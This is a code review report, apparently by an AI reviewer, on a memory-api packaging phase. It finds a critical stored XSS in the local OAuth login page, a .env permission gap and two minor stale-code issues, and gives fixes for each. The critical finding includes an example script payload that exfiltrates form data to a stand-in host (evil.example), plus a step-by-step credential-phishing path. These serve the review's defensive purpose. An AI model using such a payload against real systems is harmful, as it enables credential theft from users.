---
phase: 16-oss-light-packaging
reviewed: 2026-07-18T00:00:00Z
depth: deep
files_reviewed: 12
files_reviewed_list:
  - apps/memory-api/app/routes/oauth_authorize.py
  - apps/memory-api/app/templates/oauth_local_login.html
  - apps/memory-api/tests/test_oauth_authorize_local.py
  - infrastructure/scripts/oss-init.sh
  - Makefile
  - infrastructure/nginx/templates/10-xbrain.conf.template
  - infrastructure/docker-compose.yml
  - infrastructure/scripts/verify-phase16.sh
  - .env.example
  - apps/memory-api/.env.example
  - docs/INSTALL.md
  - README.md
findings:
  critical: 1
  warning: 1
  info: 2
  total: 4
status: issues_found
---

# Phase 16: Code Review Report

**Reviewed:** 2026-07-18T00:00:00Z
**Depth:** deep
**Files Reviewed:** 12
**Status:** issues_found

## Summary

The CSRF/open-redirect/PKCE plumbing around the new zero-key local-auth connector
branch is genuinely solid: `redirect_uri`, `client_id`, and (post-credential-proof)
`user_id` are read exclusively from the server-signed `pre_github`/`post_github`
state JWT, never from the POST body; the anti-enumeration design (identical
generic message + `verify_decoy()` timing-equalization across absent/locked/
wrong-password branches, all converging on the same `_GENERIC_LOGIN_ERROR`) is
correctly implemented and directly tested; the durable per-account lockout and
the in-process rate limiter are wired the same way `auth_local.login` already
uses them; `_finalize_consent` re-verifies both `redirect_uri` registration and
team membership in depth. `verify-phase16.sh` is an honest gate — it boots the
real 10-service core, exercises the SC#3 flow over real HTTP, explicitly asserts
a wrong password does **not** mint a code, and treats a failed boot as FAIL
(not SKIP) for every downstream check. The `oss-init.sh` secret generation is
CSPRNG-only (`openssl rand`, Fernet), fails closed if `openssl` is missing, never
echoes a secret to stdout, and writes the `.env` under `umask 077`. The nginx
`default_server` fix is correct and does not affect routing for named vhosts.

One Critical was found: the new zero-key login page (`_render_local_login` /
`oauth_local_login.html`) interpolates the OAuth client's `client_name` into raw
HTML with no escaping, and `client_name` is attacker-controlled via the public,
unauthenticated `POST /oauth/register` (RFC 7591 DCR) endpoint. Because the
vulnerable page is the credential-entry form itself (not a post-auth consent
screen), this is a self-service credential-phishing primitive hosted on the
legitimate memory-api origin, not merely a cosmetic reflected-XSS finding.

## Critical Issues

### CR-01: Unescaped `client_name` on the new local-auth login page — attacker-registrable stored XSS that can steal plaintext passwords (BLOCKER)

**File:** `apps/memory-api/app/routes/oauth_authorize.py:108-119` (new `_render_local_login`, called from the new zero-key GET `/oauth/authorize` branch at line 172-175, and reused in the new multi-team fork of `POST /oauth/authorize/local` at lines 364-378)
**File:** `apps/memory-api/app/templates/oauth_local_login.html:33-34` (`{{client_name}}` placeholder)

**Issue:**

`_render_local_login` does:

```python
client = await oauth_store.get_client(session, client_id)
client_name = (client or {}).get("client_name") or "this application"
...
html = (
    _LOCAL_LOGIN_TEMPLATE.read_text(encoding="utf-8")
    .replace("{{client_name}}", str(client_name))
    ...
)
```

`client_name` comes straight from the `oauth_clients.client_name` column with no
HTML-escaping, and that column is attacker-controlled: `POST /oauth/register`
(`apps/memory-api/app/routes/oauth_register.py`) is mounted with no auth
dependency and accepts any free-form `client_name: str | None` (RFC 7591 Dynamic
Client Registration is public by design — Claude.ai itself calls it
unauthenticated). `oauth_store.register_client` performs no length limit,
character filter, or escaping before persisting it.

Exploit path, requiring nothing but network access to the deployment:

1. Attacker calls `POST /oauth/register` with
   `client_name: "<script>fetch('https://evil.example/x?d='+document.querySelector('form').outerHTML)</script>"`
   (or a form-hijacking payload that intercepts the `email`/`password` inputs and
   exfiltrates them before/instead of the real submit), and their own
   `redirect_uris` (their own server — DCR imposes no restriction here).
2. Attacker crafts `GET /oauth/authorize?client_id=<attacker_client>&redirect_uri=<attacker_uri>&code_challenge=...&code_challenge_method=S256&response_type=code`
   and sends it to a victim (phishing link, or embeds it in any page the victim
   visits while authenticated to nothing).
3. On a zero-key install (`GITHUB_APP_CLIENT_ID` empty — the exact configuration
   this phase ships), the victim's browser lands on `_render_local_login`, which
   renders the attacker's raw HTML/JS unescaped **inside the actual email/password
   sign-in form for this deployment**.
4. The injected script runs with full DOM access to the password field before
   the victim ever submits — this is not merely "an attacker can deface a page,"
   it is "an attacker can harvest the credentials for the entire team brain,"
   using only a public, unauthenticated endpoint this same phase adds no gate to.

This is a defect this diff introduces the primary impact for: the pre-existing
GitHub-flow consent page (`github_callback`, `authorize_submit` — not modified
here) has the identical unescaped-`.replace()` pattern, but that page only
displays team names *after* the user has already authenticated via GitHub's
external, unaffected login page — the blast radius there is a same-origin XSS on
a consent screen, not a credential-theft primitive on the credential-entry form
itself. The new local-auth branch turns the same latent pattern into a direct
password-stealer, and does so on precisely the "zero-external-key" install path
this phase exists to ship.

The codebase already has the fix pattern available and in use elsewhere
(`apps/memory-api/app/routes/waitlist.py:39-41` uses `html.escape(...)` on
user-supplied strings before interpolation) — this is not a case of an unknown
convention, just a missed application of the existing one. No test in the new
`test_oauth_authorize_local.py` exercises a non-trivial `client_name` (all tests
use the literal `"Test Connector"`), so the gap is untested as well as unfixed.

**Fix:**

```python
import html as html_lib
...
client_name = (client or {}).get("client_name") or "this application"
...
.replace("{{client_name}}", html_lib.escape(str(client_name)))
```

Apply the same fix at all three call sites that interpolate `client_name` into
these two templates (`_render_local_login` at line 115, `github_callback` at
line 260, and the multi-team fork of `authorize_local_submit` at line 374) — the
last two are pre-existing but share the same root cause and the same attacker
entry point (`POST /oauth/register`). Longer-term, consider switching these
`.replace()`-based templates to a real templating engine with autoescaping
(Jinja2, already a FastAPI-ecosystem dependency) to close this class of bug for
good, and/or enforce a length/charset constraint on `client_name` at
registration time in `oauth_store.register_client`.

## Warnings

### WR-01: `oss-init.sh --force` does not reset permissions on a pre-existing `.env`

**File:** `infrastructure/scripts/oss-init.sh:74-75, 84`

**Issue:** The script sets `umask 077` immediately before `cat > "$OUT" <<EOF`,
which correctly restricts a **newly created** file to `0600`. But when `--force`
overwrites a `.env` that already exists (the only situation `--force` exists
for), `cat >` truncates and rewrites the existing inode without applying umask —
an existing file's mode bits are unaffected by umask. If an operator's prior
`.env` (e.g. produced by `cp .env.example .env`, which typically inherits the
template's more permissive default mode, or was `chmod`-relaxed for a debugging
session) was group/world-readable, `make oss-init ARGS=--force` silently
re-populates it with fresh CSPRNG secrets while leaving it readable by other
local users/processes.

**Fix:**

```bash
umask 077
cat > "$OUT" <<EOF
...
EOF
chmod 600 "$OUT"
```

Add an unconditional `chmod 600 "$OUT"` after the write so the permission
guarantee holds on both the fresh-file and `--force`-overwrite paths.

## Info

### IN-01: `00-health.conf.template` is now confirmed dead code by the new comment, but not removed

**File:** `infrastructure/nginx/templates/00-health.conf.template` (unchanged by this diff)
**File:** `infrastructure/nginx/templates/10-xbrain.conf.template:184-189` (new comment)

**Issue:** The new comment in `10-xbrain.conf.template` correctly explains why
the healthcheck probe (`Host: 127.0.0.1`) was landing in the wrong server block:
`00-health.conf.template` declares `server_name _;` **without** `default_server`,
so it is unreachable for any request whose `Host` header doesn't literally equal
the string `_`. That diagnosis is accurate, but the now-provably-dead
`00-health.conf.template` file is left in the tree, duplicating the
`/nginx-health` location that now correctly lives in the `default_server` block
of `10-xbrain.conf.template`. This isn't a regression from this diff (the file
predates it and was already dead before the fix), but the diff is the first
place that explicitly proves it's unreachable — leaving it in place invites a
future maintainer to "fix" the wrong file the next time this healthcheck breaks.

**Fix:** Delete `infrastructure/nginx/templates/00-health.conf.template` (or fold
a one-line pointer comment into it noting the real implementation moved to
`10-xbrain.conf.template`'s `default_server` block) in a follow-up cleanup.

### IN-02: `Makefile`'s `preflight` target doc comment is stale relative to `env-check`'s new var count

**File:** `Makefile:126`

**Issue:** `preflight:  ## Pre-deploy crashloop guard — same 5 vars as env-check, actionable messages (B3)`.
This diff's `env-check` rewrite now checks 7 core vars unconditionally
(`POSTGRES_PASSWORD BRIDGE_SHARED_SECRET OAUTH_ISSUER_URL OAUTH_RESOURCE_URL
CORS_ALLOWED_ORIGIN_REGEX XBRAIN_BASE_DOMAIN AGENT_MENTION_ALIASES`), plus up to
4 more under the `saas` profile, while `preflight-env.sh` still checks a fixed 5
(`OAUTH_ISSUER_URL`, `OAUTH_RESOURCE_URL`, `CORS_ALLOWED_ORIGIN_REGEX`,
`XBRAIN_BASE_DOMAIN`, `AGENT_MENTION_ALIASES`) plus the profile/edition
consistency check. The "same 5 vars" claim was already imprecise before this
diff (env-check previously checked 11 vars including SaaS creds) and remains
imprecise now — not a functional bug, just a comment that will mislead the next
person trying to understand why `env-check` and `preflight` can disagree.

**Fix:** Update the comment to something like `## Pre-deploy crashloop guard —
5 ingress/identity vars (subset of env-check's core set), actionable messages (B3)`,
or simply drop the "same 5 vars" claim.

---

_Reviewed: 2026-07-18T00:00:00Z_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: deep_
